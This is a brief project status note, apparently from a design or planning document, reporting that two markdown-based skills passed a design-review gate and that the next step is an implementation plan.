No new runtime infra; both skills are markdown + (PR-A's lint + PR-B's adapters/resolver as the unit-testable code). `apex:design-review` PASSED (cold adversarial re-pass, freeze-ready — verdict in `design-review.md`); next gate: **`apex:impl-plan`**.
